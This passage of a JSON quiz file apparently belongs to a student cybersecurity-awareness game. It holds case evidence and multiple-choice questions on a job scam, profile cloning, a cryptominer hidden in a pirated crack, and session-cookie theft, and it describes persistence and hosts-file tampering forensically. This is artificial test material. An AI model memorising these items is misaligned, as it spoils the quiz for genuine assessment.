          "10 years old",
          "5 years old",
          "6 months old"
        ]
      },
      {
        "text": "What top-level domain (TLD) extension was used for the fake recruiting site?",
        "options": [
          ".edu",
          ".com",
          ".gov.in",
          ".site"
        ]
      },
      {
        "text": "What Virtual Payment Address (VPA) received the fraudulent ₹3,000 deposit?",
        "options": [
          "admin@icici",
          "quick_refund_desk@ybl",
          "hr_dep_proc@okaxis",
          "college@sbi"
        ]
      },
      {
        "text": "In which city was the stolen money withdrawn from an ATM?",
        "options": [
          "Kolkata",
          "Noida",
          "Chennai",
          "Mumbai"
        ]
      },
      {
        "text": "What key identifier on the forged offer letter was proven to be invalid upon verification?",
        "options": [
          "CIN (Corporate Identity Number)",
          "Page number",
          "Font color",
          "Paper thickness"
        ]
      },
      {
        "text": "Why did the scammer insist on shifting communication to Telegram handle '@HR_Sneha_Verify'?",
        "options": [
          "To send larger video files of the laptop",
          "Because Telegram is the mandatory tool for all HR departments in India",
          "Because email servers cannot attach PDF offer letters",
          "To evade corporate email traceability, law enforcement subpoenas, and automated spam filtering"
        ]
      },
      {
        "text": "What does a 21-character Indian Corporate Identity Number (CIN) identify?",
        "options": [
          "The Wi-Fi password of the corporate headquarters",
          "The IP address of the company's web server",
          "A unique registration code assigned by the Registrar of Companies to legal corporate entities",
          "The bank account number of the company's CEO"
        ]
      },
      {
        "text": "What visual quality issue in the offer letter PDF pointed to forgery during document analysis?",
        "options": [
          "The text was printed in black ink",
          "A low-resolution stolen logo with typographical errors",
          "The document was saved in landscape orientation",
          "The PDF was only two pages long"
        ]
      },
      {
        "text": "How do newly registered domains (NRDs) feature in threat intelligence risk scoring?",
        "options": [
          "Domains under 30 days old are heavily categorized as high risk because threat actors create them for short-lived scams",
          "New domains are automatically granted verified status by Google",
          "They are exempt from all cyber laws",
          "New domains cannot be accessed by mobile phones"
        ]
      },
      {
        "text": "What is the typical operational role of an ATM cash-out operative in an organized cyber scam gang?",
        "options": [
          "To write the legal terms and conditions",
          "To design the HTML templates for fake websites",
          "To manage the cloud server firewalls",
          "To physically withdraw digital stolen funds as cash immediately upon receipt before bank freezes can take effect"
        ]
      },
      {
        "text": "Why are cheap generic TLDs like '.site', '.xyz', or '.top' disproportionately favored by scam operations?",
        "options": [
          "They cannot be blocked by modern web browsers",
          "They provide free satellite internet to customers",
          "They offer low registration costs and minimal identity verification, making disposable campaigns cheap to deploy",
          "They are owned by the United Nations"
        ]
      },
      {
        "text": "What legal liability could a student face if they fall for a 'money transfer job' and receive funds for others?",
        "options": [
          "They receive free college tuition",
          "They could be criminally charged as an unwitting money mule participating in financial fraud and money laundering",
          "They are automatically hired by the national bank",
          "They are awarded a certificate in digital banking"
        ]
      },
      {
        "text": "What forensic verification tool can be used to check if a corporate domain was registered only 4 days ago?",
        "options": [
          "WHOIS lookup tools / ICANN Domain Registration Data Lookup",
          "Disk defragmenter",
          "Task Manager",
          "Calculator app"
        ]
      },
      {
        "text": "Analyzing the scam's multi-stage operational model, what was the primary monetization mechanism?",
        "options": [
          "Selling high-end laptops at a wholesale markup",
          "Mining cryptocurrency on the victim's phone",
          "Providing legitimate IT consulting services",
          "Extorting multiple small upfront deposits (₹3,000) from dozens of victims, then severing communication"
        ]
      },
      {
        "text": "What comprehensive verification protocol should a candidate follow before accepting an unknown job offer?",
        "options": [
          "Pay the requested deposit immediately and wait for the courier tracking code",
          "Share banking PINs to verify account compatibility",
          "Verify corporate MCA registry, check domain age via WHOIS, cross-check official company career portals, and reject upfront fees",
          "Ask the recruiter on Telegram if they are genuine"
        ]
      }
    ]
  },
  "case-08": {
    "id": "case-08",
    "name": "CASE 08 — ONLINE IDENTITY THEFT",
    "summary": "Someone is using another person's identity online. Examine the evidence to determine what happened.",
    "evidence": [
      {
        "tag": "IMPERSONATION PROFILE",
        "time": "INCIDENT RECORD 01",
        "title": "DUPLICATE SOCIAL ACCOUNT",
        "details": "A fake profile using the student's full name, bio, and real profile photos was created with username '@student_official_2026'."
      },
      {
        "tag": "FRAUD MESSAGES",
        "time": "INCIDENT RECORD 02",
        "title": "MONEY SOLICITATION CHAT",
        "details": "The fake profile messaged 30 classmates claiming an urgent hospital emergency and pleading for immediate ₹2,000 UPI emergency transfers."
      },
      {
        "tag": "PROFILE ANALYSIS",
        "time": "INCIDENT RECORD 03",
        "title": "RECENT CREATION DATE",
        "details": "The impersonating profile was registered only 14 hours ago with zero posts prior to broadcasting the emergency medical loan requests."
      },
      {
        "tag": "REPORTING AUDIT",
        "time": "INCIDENT RECORD 04",
        "title": "MULTIPLE USER REPORTS",
        "details": "Ten classmates filed impersonation reports with the social media platform's trust and safety operations team."
      }
    ],
    "round2Evidence": [
      {
        "tag": "IMAGE FORENSICS",
        "time": "15:10:00 UTC",
        "title": "STOLEN PHOTO EXIF STRIPPING",
        "details": "The avatar image was scraped directly from the victim's public Facebook gallery; metadata analysis confirms original EXIF camera data was stripped by a web downloader script."
      },
      {
        "tag": "IP GEOLOCATION",
        "time": "15:25:30 UTC",
        "title": "RESIDENTIAL PROXY ROTATION",
        "details": "Login sessions for '@student_official_2026' originated from a rotating Indian residential proxy network (AS133612), masking the actual creator's device IP."
      },
      {
        "tag": "VIRTUAL NUMBER",
        "time": "15:40:00 UTC",
        "title": "DISPOSABLE VOIP SMS VERIFICATION",
        "details": "The fake account was registered using a virtual burner VoIP number (+1 202-555-0143) obtained from a temporary SMS reception website."
      },
      {
        "tag": "PAYMENT INTENT",
        "time": "15:52:10 UTC",
        "title": "THIRD-PARTY MULE VPA EXPOSURE",
        "details": "The UPI address provided in the chats was 'urgent_help_med77@paytm', linked to an account holder with a completely different name residing in another state."
      }
    ],
    "questions": [
      {
        "text": "What handle username was used by the impersonating social media account?",
        "options": [
          "@student_official_2026",
          "@support_desk_user",
          "@real_student_99",
          "@official_tjs_college"
        ]
      },
      {
        "text": "How many hours before the incident was the fake profile created?",
        "options": [
          "1 month ago",
          "365 days ago",
          "5 years ago",
          "14 hours ago"
        ]
      },
      {
        "text": "How much money did the fake account request from classmates?",
        "options": [
          "₹50,000",
          "₹100",
          "₹2,000",
          "₹20,000"
        ]
      },
      {
        "text": "What emotional pretext did the impersonator use to demand money?",
        "options": [
          "A winning lottery ticket fee",
          "An urgent hospital medical emergency",
          "A movie ticket booking",
          "A college library fine"
        ]
      },
      {
        "text": "How many classmates were messaged by the fake account?",
        "options": [
          "30 classmates",
          "None",
          "2 classmates",
          "500 classmates"
        ]
      },
      {
        "text": "How many classmates filed official impersonation reports with the platform?",
        "options": [
          "Zero",
          "One hundred",
          "Only the victim",
          "Ten classmates"
        ]
      },
      {
        "text": "What was suspicious about the profile's post history?",
        "options": [
          "It had posts dating back to 2010",
          "All posts were written in French",
          "It had zero posts prior to the scam messages",
          "It had 10,000 photos of college exams"
        ]
      },
      {
        "text": "What should a friend do before sending money to a classmate asking for emergency cash online?",
        "options": [
          "Immediately transfer the money without asking questions",
          "Call the friend directly via phone or voice call to verify their identity and situation",
          "Send double the requested amount",
          "Post about it on an open social media story"
        ]
      },
      {
        "text": "How did the impersonator acquire the victim's profile pictures?",
        "options": [
          "By copying public photos already visible on the student's social accounts",
          "By taking photos through the student's bedroom window",
          "By drawing sketches by hand",
          "By hacking into a national satellite system"
        ]
      },
      {
        "text": "What platform feature allows users to report someone pretending to be them?",
        "options": [
          "Archive Story",
          "Add Close Friends",
          "Delete Account",
          "Report Account -> Impersonation"
        ]
      },
      {
        "text": "Why do scammers target multiple mutual friends of the victim simultaneously?",
        "options": [
          "Because social platforms only allow sending 30 messages",
          "To test who has the fastest internet speed",
          "Mutual friends are more likely to trust messages that seem to come from a real acquaintance",
          "To improve the victim's social media follower count"
        ]
      },
      {
        "text": "What privacy setting on social media prevents strangers from viewing your friend lists and photos?",
        "options": [
          "Setting the profile to Public",
          "Setting the profile to Private (Friends Only)",
          "Disabling dark mode",
          "Enabling autoplay videos"
        ]
      },
      {
        "text": "What is this specific cybercrime called when an attacker creates a replica profile to defraud friends?",
        "options": [
          "Social Media Cloning / Impersonation Fraud",
          "Cryptojacking",
          "Distributed Denial of Service",
          "SQL Injection"
        ]
      },
      {
        "text": "Why did the scammer choose a username with '_official_2026' added to the student's name?",
        "options": [
          "Because the student had legally registered that trademark",
          "Because official platforms require all users to end with '_2026'",
          "To ensure the profile was verified by government authorities",
          "The victim's exact username was already taken, so the scammer added realistic-sounding suffixes"
        ]
      },
      {
        "text": "What is the critical distinction between 'Account Takeover' and 'Account Cloning'?",
        "options": [
          "Account Takeover only happens on desktop computers",
          "Account Cloning requires a physical fingerprint scanner",
          "In an Account Takeover, the original account password is stolen; in Cloning, a completely separate fake profile is created",
          "There is no difference; they are identical concepts"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What type of IP network masked the real creator of '@student_official_2026'?",
        "options": [
          "The college hostel Wi-Fi network",
          "An unencrypted Bluetooth link",
          "A government satellite connection",
          "A rotating residential proxy network (AS133612)"
        ]
      },
      {
        "text": "What virtual phone number country code was used to register the fake account via SMS?",
        "options": [
          "+44 (United Kingdom)",
          "+91 (India)",
          "+1 (United States)",
          "+49 (Germany)"
        ]
      },
      {
        "text": "What Virtual Payment Address (VPA) was given to classmates for the emergency transfers?",
        "options": [
          "student_fund@okaxis",
          "urgent_help_med77@paytm",
          "quick_refund_desk@ybl",
          "hospital_care@sbi"
        ]
      },
      {
        "text": "What forensic clue in the VPA proved that the money was NOT going to the student?",
        "options": [
          "The linked bank account holder had a completely different name and was located in another state",
          "Paytm is not permitted to accept money in India",
          "The VPA expired after 10 minutes",
          "The VPA used capital letters"
        ]
      },
      {
        "text": "What does EXIF metadata in an original photo typically reveal before being stripped?",
        "options": [
          "The full home address of everyone in the picture",
          "The password of the photographer's computer",
          "The photographer's bank balance",
          "Camera model, timestamp, exposure settings, and GPS geolocation coordinates"
        ]
      },
      {
        "text": "Why do fraudsters use residential proxies rather than standard commercial VPNs?",
        "options": [
          "Residential proxies make photos appear in higher quality",
          "Residential proxies are completely free for all hackers",
          "Residential proxy IPs belong to genuine home broadband users, avoiding automated fraud detection flags",
          "Residential proxies make accounts permanently verified"
        ]
      },
      {
        "text": "How do temporary online SMS reception websites enable fraudulent social media signups?",
        "options": [
          "They manufacture physical plastic SIM cards",
          "They provide shared virtual numbers that receive verification OTP codes without requiring identity KYC",
          "They bypass internet service providers",
          "They allow calling anyone in the world for free"
        ]
      },
      {
        "text": "What evidence should the victim gather before reporting the impersonating account for deletion?",
        "options": [
          "Timestamped screenshots of the profile URL, account handle, and chat messages with payment VPAs",
          "Deleting their own real account",
          "A video of the victim closing their laptop",
          "A handwritten drawing of the profile picture"
        ]
      },
      {
        "text": "What is the primary motive behind verifying the beneficiary name in UPI apps before sending funds?",
        "options": [
          "To check how many friends the payee has",
          "To see what phone model the payee is using",
          "To verify the payee's battery percentage",
          "UPI apps display the official bank account holder name, exposing if the payee is a stranger"
        ]
      },
      {
        "text": "How do social media Trust & Safety teams verify legitimate identity during impersonation claims?",
        "options": [
          "By measuring the size of the profile picture",
          "By checking who has logged in most frequently this week",
          "By requiring government-issued photo ID verification matching the genuine account owner's legal name",
          "By asking all followers to vote in a public poll"
        ]
      },
      {
        "text": "Why is public social media friend list visibility a major risk factor for cloning attacks?",
        "options": [
          "It slows down internet connection speeds",
          "It provides scammers with a ready-made directory of close contacts to target with personalized messages",
          "It forces friends to change their passwords",
          "It causes the phone to heat up when opened"
        ]
      },
      {
        "text": "What legal section under the Information Technology Act in India penalizes identity theft and impersonation?",
        "options": [
          "Section 66C and Section 66D of the IT Act",
          "Motor Vehicles Act Section 12",
          "Section 302 of IPC",
          "Section 144 of CrPC"
        ]
      },
      {
        "text": "How can telecom and bank authorities freeze the mule account 'urgent_help_med77@paytm'?",
        "options": [
          "By unlinking all ATMs in the country",
          "By calling the local police station in London",
          "By sending an SMS asking the scammer to return the money",
          "By filing an immediate cybercrime portal complaint (cybercrime.gov.in) triggering an inter-bank lien freeze"
        ]
      },
      {
        "text": "Synthesizing the digital evidence, what was the adversary's complete operational setup?",
        "options": [
          "Zero-day exploit -> Firmware rewrite -> Memory dump -> Satellite uplink",
          "Trojanized Android APK -> Hardware keylogger -> Physical SIM clone -> Direct bank wire",
          "Scraped public photo gallery -> Burner VoIP number for SMS OTP -> Residential proxy for login -> Third-party mule VPA for cash collection",
          "Wi-Fi eavesdropping -> Man-in-the-Middle certificate injection -> Database drop -> Ransom demand"
        ]
      },
      {
        "text": "What preventative measures should colleges educate students on to guard against identity cloning?",
        "options": [
          "Change smartphone numbers every two weeks",
          "Keep friend lists private, limit photo visibility, never send funds without voice verification, and report fake profiles immediately",
          "Never take any photographs with digital cameras",
          "Delete all social media accounts permanently"
        ]
      }
    ]
  },
  "case-09": {
    "id": "case-09",
    "name": "CASE 09 — MALWARE INFECTION",
    "summary": "A computer behaves strangely after a suspicious file is opened. Investigate how the file may have infected the system.",
    "evidence": [
      {
        "tag": "DOWNLOAD LOG",
        "time": "INCIDENT RECORD 01",
        "title": "PIRATED SOFTWARE CRACK",
        "details": "User downloaded 'Photoshop_Crack_Setup.exe' from an unverified third-party torrent site."
      },
      {
        "tag": "TASK MANAGER",
        "time": "INCIDENT RECORD 02",
        "title": "HIGH CPU CRYPTOMINER",
        "details": "Hidden background process 'system_host32.exe' utilizing 98% of CPU to mine cryptocurrency."
      },
      {
        "tag": "ANTIVIRUS LOG",
        "time": "INCIDENT RECORD 03",
        "title": "DEFENDER DISABLED",
        "details": "Windows Defender was manually disabled by the user following crack instructions."
      },
      {
        "tag": "NETWORK TRAFFIC",
        "time": "INCIDENT RECORD 04",
        "title": "C2 BEACONING DETECTED",
        "details": "Continuous outbound traffic to known malicious mining pool IP 185.220.101.5 on port 3333."
      }
    ],
    "round2Evidence": [
      {
        "tag": "PROCESS TREE",
        "time": "16:22:10 UTC",
        "title": "MALICIOUS CHILD PROCESS SPAWN",
        "details": "Process execution tree confirms 'Photoshop_Crack_Setup.exe' (PID 4820) spawned hidden PowerShell command which dropped 'system_host32.exe' (PID 7912) into 'C:\\Users\\User\\AppData\\Roaming\\Microsoft\\svchost\\'."
      },
      {
        "tag": "PERSISTENCE REGISTRY",
        "time": "16:23:45 UTC",
        "title": "REGISTRY RUN KEY INJECTION",
        "details": "Registry persistence established under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' with key name 'WindowsAudioService' pointing to the mining binary."
      },
      {
        "tag": "HOSTS FILE TAMPER",
        "time": "16:25:00 UTC",
        "title": "ANTIVIRUS UPDATE BLOCKING",
        "details": "'C:\\Windows\\System32\\drivers\\etc\\hosts' modified to redirect Microsoft Defender and antivirus update domains to localhost (127.0.0.1)."
      },
      {
        "tag": "WALLET TRACE",
        "time": "16:28:30 UTC",
        "title": "MONERO POOL CONFIGURATION",
        "details": "Extracted config file 'config.json' from Roaming folder details connection to pool 'xmr-pool.minexmr.com:3333' with hardcoded wallet address '48Xmr99...'."
      }
    ],
    "questions": [
      {
        "text": "What pirated file did the student download from the torrent website?",
        "options": [
          "college_timetable.pdf",
          "family_vacation.mp4",
          "homework_notes.docx",
          "Photoshop_Crack_Setup.exe"
        ]
      },
      {
        "text": "What hidden background process was consuming 98% of the computer's CPU?",
        "options": [
          "chrome.exe",
          "calculator.exe",
          "system_host32.exe",
          "notepad.exe"
        ]
      },
      {
        "text": "What activity was the malicious background process performing?",
        "options": [
          "Playing video games",
          "Mining cryptocurrency",
          "Editing photographs",
          "Printing documents"
        ]
      },
      {
        "text": "Why did the student manually disable Windows Defender antivirus?",
        "options": [
          "Following instructions inside the pirated crack download",
          "To make the screen brighter",
          "To increase internet download speed",
          "Windows Defender asked to be turned off"
        ]
      },
      {
        "text": "To what port was continuous outbound traffic directed in the network log?",
        "options": [
          "Port 21",
          "Port 443",
          "Port 80",
          "Port 3333"
        ]
      },
      {
        "text": "What IP address was identified as the malicious mining pool destination?",
        "options": [
          "10.0.0.1",
          "192.168.1.1",
          "185.220.101.5",
          "127.0.0.1"
        ]
      },
      {
        "text": "Why do crack websites commonly instruct users to 'turn off your antivirus'?",
        "options": [
          "Because antivirus software makes the download take 3 days",
          "Because antivirus software detects the bundled malware and Trojan droppers",
          "Because antivirus software charges a fee for cracks",
          "Because antivirus software turns the computer off"
        ]
      },
      {
        "text": "What physical symptom on a laptop typically indicates high CPU cryptomining?",
        "options": [
          "The laptop runs extremely hot, the cooling fan spins at maximum speed, and performance slows drastically",
          "The screen turns upside down",
          "The power cable unplugs itself",
          "The keyboard letters change order"
        ]
      },
      {
        "text": "Where should users download legitimate software applications from?",
        "options": [
          "Anonymous torrent sites",
          "Unverified file sharing chat groups",
          "Random download buttons on illegal streaming pages",
          "Official vendor websites and verified app stores"
        ]
      },
      {
        "text": "What term describes malware that stealthily uses a victim's hardware to mine cryptocurrency?",
        "options": [
          "Adware",
          "Phishing email",
          "Cryptojacker / Cryptominer malware",
          "Spyware"
        ]
      },
      {
        "text": "What tool in Windows allows users to view CPU usage by running processes?",
        "options": [
          "File Explorer",
          "Task Manager",
          "Paint",
          "Notepad"
        ]
      },
      {
        "text": "What type of malware file pretends to be a useful program but contains a malicious payload?",
        "options": [
          "A Trojan horse",
          "A computer monitor",
          "An optical mouse",
          "A hard drive cable"
        ]
      },
      {
        "text": "What is the first step when you suspect your computer is infected with an active mining Trojan?",
        "options": [
          "Leave the computer on for 48 hours to finish mining",
          "Buy more RAM memory",
          "Turn the monitor off and keep working",
          "Disconnect from the network (unplug Wi-Fi) and run a full bootable antivirus scan"
        ]
      },
      {
        "text": "Why did the malware name its process 'system_host32.exe'?",
        "options": [
          "Because the computer was built in the year 1932",
          "To improve computer gaming performance",
          "To disguise itself as a legitimate Windows operating system service (like svchost.exe)",
          "Because Windows requires all programs to have 'host32' in the title"
        ]
      },
      {
        "text": "Why is downloading pirated software often described as the most common entry vector for student malware infections?",
        "options": [
          "Pirated files are downloaded over satellite frequencies",
          "Users voluntarily bypass their own antivirus defenses and grant administrative permissions to run the installer",
          "Torrent software is illegal in all countries",
          "Pirated files can only be opened on government computers"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "In what directory path did the malware hide the binary 'system_host32.exe'?",
        "options": [
          "C:\\Program Files\\Adobe\\Photoshop\\",
          "C:\\Users\\User\\Desktop\\",
          "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\svchost\\",
          "C:\\Windows\\System32\\"
        ]
      },
      {
        "text": "What registry key was modified to ensure the miner launches automatically every time the PC boots?",
        "options": [
          "HKLM\\Software\\Classes",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "HKCU\\Control Panel\\Desktop",
          "HKLM\\System\\CurrentControlSet\\Services"
        ]
      },
      {
        "text": "What deceptive name was given to the startup registry key?",
        "options": [
          "WindowsAudioService",
          "MalwareRunner",
          "CryptoMiner99",
          "PhotoshopCrack"
        ]
      },
      {
        "text": "What critical system file was tampered with to prevent the antivirus from downloading signature updates?",
        "options": [
          "C:\\Windows\\boot.ini",
          "C:\\Windows\\explorer.exe",
          "C:\\Windows\\regedit.exe",
          "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
      },
      {
        "text": "To what IP address did the modified hosts file redirect antivirus update services?",
        "options": [
          "0.0.0.0",
          "192.168.1.1",
          "127.0.0.1 (localhost)",
          "8.8.8.8"
        ]
      },
      {
        "text": "What specific cryptocurrency was targeted by the mining pool configuration file?",
        "options": [
          "Bitcoin (BTC)",
          "Monero (XMR)",
          "Ethereum (ETH)",
          "Dogecoin (DOGE)"
        ]
      },
      {
        "text": "Why is Monero (XMR) the preferred cryptocurrency for illicit cryptojacking campaigns?",
        "options": [
          "It uses privacy-centric ring signatures and stealth addresses, making illicit transactions untraceable",
          "It is owned by the United Nations",
          "It can only be mined on Apple iPhones",
          "It does not require any CPU power to mine"
        ]
      },
      {
        "text": "What process ID (PID) was assigned to the dropped mining payload 'system_host32.exe'?",
        "options": [
          "PID 0",
          "PID 100",
          "PID 4820",
          "PID 7912"
        ]
      },
      {
        "text": "How did the initial installer 'Photoshop_Crack_Setup.exe' execute the hidden payload without showing a window?",
        "options": [
          "It waited for the user to close their eyes",
          "It unplugged the computer monitor temporarily",
          "It spawned a hidden PowerShell background execution with '-WindowStyle Hidden' and '-ExecutionPolicy Bypass'",
          "It converted the code into an MP3 song"
        ]
      },
      {
        "text": "Why is the 'AppData\\Roaming' folder frequently used by malware droppers on Windows?",
        "options": [
          "It is the only folder that can run .exe files",
          "It has write permissions for standard user accounts and does not require administrative elevation to place files",
          "It is automatically encrypted by Microsoft",
          "Files in AppData are invisible to antivirus engines"
        ]
      },
      {
        "text": "What technique did the malware employ when routing update domains to 127.0.0.1 in the hosts file?",
        "options": [
          "DNS sinkholing / Local hosts file hijacking",
          "ARP cache poisoning",
          "BGP route hijacking",
          "SSL certificate pinning"
        ]
      },
      {
        "text": "How can a forensic analyst identify unauthorized modifications to the Windows hosts file?",
        "options": [
          "By checking the desktop background wallpaper",
          "By converting the file to a JPEG image",
          "By counting the total letters in the document",
          "By inspecting the file's last modified timestamp and comparing entries against the default clean template"
        ]
      },
      {
        "text": "What is the primary indicator of compromise (IOC) associated with network telemetry in this case?",
        "options": [
          "HTTP web traffic on port 80 to wikipedia.org",
          "DNS queries on port 53 to google.com",
          "Persistent outbound TCP connections on port 3333 to IP 185.220.101.5 (Stratum mining protocol)",
          "NTP time synchronization on port 123"
        ]
      },
      {
        "text": "Reconstructing the infection lifecycle, what were the four stages from download to ongoing exploitation?",
        "options": [
          "Outbound mining -> Torrent download -> Dropper writes to AppData -> Defender disabled",
          "Torrent download -> User disables Defender -> Dropper writes to AppData & Registry Run -> Outbound Stratum mining beaconing",
          "Defender disabled -> Outbound mining -> Torrent download -> Dropper writes to AppData",
          "Registry Run -> Outbound mining -> Torrent download -> Dropper writes to AppData"
        ]
      },
      {
        "text": "What is the comprehensive remediation plan required to restore this machine to a verified clean state?",
        "options": [
          "Kill PID 7912, delete malicious Roaming folder, delete Run registry key, restore default hosts file, and enable Defender",
          "Simply close Task Manager and restart the laptop once",
          "Disconnect the power cord while running",
          "Delete the torrent file from the Downloads folder only"
        ]
      }
    ]
  },
  "case-10": {
    "id": "case-10",
    "name": "CASE 10 — SUSPICIOUS ACCOUNT LOGIN",
    "summary": "An account shows an unexpected login from an unfamiliar device. Examine the available details to identify suspicious activity.",
    "evidence": [
      {
        "tag": "SECURITY ALERT",
        "time": "INCIDENT RECORD 01",
        "title": "NEW DEVICE ALERT",
        "details": "Email alert received: 'New sign-in detected on Safari on macOS from Sao Paulo, Brazil at 02:40 UTC.'"
      },
      {
        "tag": "DEVICE INVENTORY",
        "time": "INCIDENT RECORD 02",
        "title": "NO APPLE DEVICES OWNED",
        "details": "Student's hardware inventory: only owns an Android smartphone and an HP Windows laptop; does not own any Apple Mac hardware."
      },
      {
        "tag": "TIME ANALYSIS",
        "time": "INCIDENT RECORD 03",
        "title": "SIMULTANEOUS LOGIN SESSIONS",
        "details": "Active sessions table shows Chennai session active at 02:35 UTC, followed 5 minutes later by Sao Paulo session 14,000 km away."
      },
      {
        "tag": "SESSION ACTION",
        "time": "INCIDENT RECORD 04",
        "title": "EXPORTED CHAT DATA",
        "details": "The Brazilian session immediately navigated to account settings and initiated an archive download of private chat messages and cloud drive files."
      }
    ],
    "round2Evidence": [
      {
        "tag": "BROWSER TELEMETRY",
        "time": "02:41:10 UTC",
        "title": "STOLEN SESSION COOKIE HIJACK",
        "details": "Authentication logs confirm the Brazilian connection bypassed login credential entry and 2FA completely by presenting a cloned session cookie ('session_id=8f91a...')."
      },
      {
        "tag": "EXTENSION AUDIT",
        "time": "02:43:00 UTC",
        "title": "MALICIOUS CHROME EXTENSION",
        "details": "Forensic inspection of the student's Windows laptop identified an unverified browser extension 'DarkTheme_Pro_v4' installed 2 days ago that extracted active session cookies."
      },
      {
        "tag": "EXFILTRATION RECORD",
        "time": "02:45:30 UTC",
        "title": "CLOUD STORAGE ARCHIVE DOWNLOAD",
        "details": "2.1 GB archive 'user_archive_backup.zip' containing photos and private documents was downloaded to IP 177.136.240.18 over a 4-minute window."
      },
      {
        "tag": "SECURITY TAMPER",
        "time": "02:47:00 UTC",
        "title": "MUTED SECURITY NOTIFICATIONS",
        "details": "Attacker updated notification preferences to disable 'New Login Emails' and 'Password Change Alerts' to delay owner detection."
      }
    ],
    "questions": [
      {
        "text": "In what city and country did the suspicious new device sign-in occur?",
        "options": [
          "Chennai, India",
          "London, UK",
          "Sao Paulo, Brazil",
          "Tokyo, Japan"
        ]
      },
      {
        "text": "What operating system and browser were reported in the security alert?",
        "options": [
          "Edge on Android",
          "Safari on macOS",
          "Chrome on Windows",
          "Firefox on Linux"
        ]
      },
      {
        "text": "What hardware devices does the student actually own?",
        "options": [
          "An Android smartphone and an HP Windows laptop",
          "Only a Linux server",
          "Only an Apple iPhone",
          "A MacBook Pro and an iPad"
        ]
      },
      {
        "text": "How many kilometers apart are Chennai and Sao Paulo geographically?",
        "options": [
          "100 km",
          "10 km",
          "500 km",
          "Approximately 14,000 km"
        ]
      },
      {
        "text": "How many minutes elapsed between the Chennai session and the Sao Paulo session?",
        "options": [
          "60 minutes",
          "3 days",
          "5 minutes",
          "24 hours"
        ]
      },
      {
        "text": "Why is logging in from two locations 14,000 km apart within 5 minutes physically impossible for one person?",
        "options": [
          "Because internet connections cannot travel across the equator",
          "A human cannot travel 14,000 kilometers in 5 minutes (impossible travel time)",
          "Because flights only take off once a month",
          "Because computers do not function across oceans"
        ]
      },
      {
        "text": "What action was immediately executed by the Brazilian session upon accessing the account?",
        "options": [
          "Initiated an archive download of private chat messages and cloud drive files",
          "Deleted the student's browser bookmarks",
          "Played music on YouTube",
          "Changed the language to Spanish"
        ]
      },
      {
        "text": "Why should users take 'New Device Sign-in' email notifications seriously?",
        "options": [
          "They are sent as promotional spam by device manufacturers",
          "They change the user's password automatically",
          "They give users discounts on new laptops",
          "They warn users of unauthorized account access from unknown devices immediately"
        ]
      },
      {
        "text": "At what UTC time was the suspicious Sao Paulo sign-in recorded?",
        "options": [
          "12:00 UTC",
          "08:15 UTC",
          "02:40 UTC",
          "18:45 UTC"
        ]
      },
      {
        "text": "What setting in modern accounts allows users to instantly terminate all unfamiliar active sessions?",
        "options": [
          "Export contacts",
          "Log out of all other devices / Sign out all sessions",
          "Clear search history",
          "Change profile picture"
        ]
      },
      {
        "text": "Does owning only an Android and Windows laptop make a 'macOS Safari' login alert suspicious?",
        "options": [
          "Yes, it proves someone on an unrecognized Apple device accessed the account",
          "No, all devices look identical to web servers",
          "No, Windows laptops frequently report themselves as macOS Safari",
          "No, Android phones are made by Apple"
        ]
      },
      {
        "text": "What feature should you immediately activate after logging out unauthorized sessions?",
        "options": [
          "Bigger font size",
          "High contrast mode",
          "Airplane mode for 5 days",
          "Two-Factor Authentication (2FA) with an Authenticator App"
        ]
      },
      {
        "text": "What security term describes an impossible travel anomaly in identity security?",
        "options": [
          "SQL Injection",
          "DDoS attack",
          "Impossible Travel / Geolocation Velocity alert",
          "Buffer Overflow"
        ]
      },
      {
        "text": "Why did the attacker prioritize downloading the chat archive and cloud files immediately?",
        "options": [
          "To test their internet download speed",
          "To exfiltrate sensitive personal data before the account owner wakes up and revokes the session",
          "To help the student save storage space",
          "Because cloud backups are deleted every 10 minutes"
        ]
      },
      {
        "text": "Could using a standard commercial VPN on the student's phone explain this anomaly?",
        "options": [
          "Even if the IP changed via VPN, it would NOT change the device user-agent from Android to macOS Safari",
          "Yes, VPNs change your device brand randomly every minute",
          "Yes, VPNs automatically convert Android phones into MacBooks",
          "Yes, VPNs only connect to Brazil"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "How did the Brazilian session bypass password entry and 2FA authentication completely?",
        "options": [
          "By calling customer support on the phone",
          "By presenting a stolen, active session cookie ('session_id=8f91a...')",
          "By hacking into the telecommunications satellite",
          "By guessing the student's password on the first try"
        ]
      },
      {
        "text": "What rogue software on the student's laptop extracted and exfiltrated the session cookie?",
        "options": [
          "An unverified browser extension 'DarkTheme_Pro_v4'",
          "Google Docs",
          "Windows Calculator",
          "The official HP printer driver"
        ]
      },
      {
        "text": "What was the size of the downloaded cloud storage archive 'user_archive_backup.zip'?",
        "options": [
          "100 GB",
          "10 MB",
          "500 KB",
          "2.1 GB"
        ]
      },
      {
        "text": "What IP address received the 2.1 GB exfiltrated archive download?",
        "options": [
          "127.0.0.1",
          "10.0.0.1",
          "177.136.240.18",
          "192.168.1.1"
        ]
      },
      {
        "text": "What setting did the attacker tamper with to prevent the owner from noticing future alerts?",
        "options": [
          "Changed the account timezone to UTC",
          "Disabled 'New Login Emails' and 'Password Change Alerts'",
          "Deleted all emails older than 1 year",
          "Turned off computer monitor brightness"
        ]
      },
      {
        "text": "Why are malicious browser extensions particularly dangerous for session token security?",
        "options": [
          "Extensions with broad permissions can read all cookies and web requests across every visited tab",
          "Extensions only work when the computer is turned off",
          "Extensions automatically delete the operating system",
          "Extensions make computer fans run backward"
        ]
      },
      {
        "text": "What is the technical term for stealing an active session token to impersonate an authenticated user?",
        "options": [
          "ARP Poisoning",
          "SYN Flood",
          "Buffer Overflow",
          "Session Hijacking / Cookie Theft"
        ]
      },
      {
        "text": "Why did traditional SMS Two-Factor Authentication fail to stop the attacker at 02:40 UTC?",
        "options": [
          "The student's mobile carrier shut down",
          "The phone battery was completely dead",
          "Session cookies represent an already-authenticated session, so the server never prompted for 2FA",
          "The SMS was intercepted by a drone"
        ]
      },
      {
        "text": "How can modern web applications mitigate session cookie replay across geographically disparate devices?",
        "options": [
          "Make passwords twice as long",
          "Enforce device fingerprint binding, IP subnet correlation, and invalidate sessions on sudden impossible travel",
          "Block all users from using dark mode themes",
          "Require users to change passwords every 30 minutes"
        ]
      },
      {
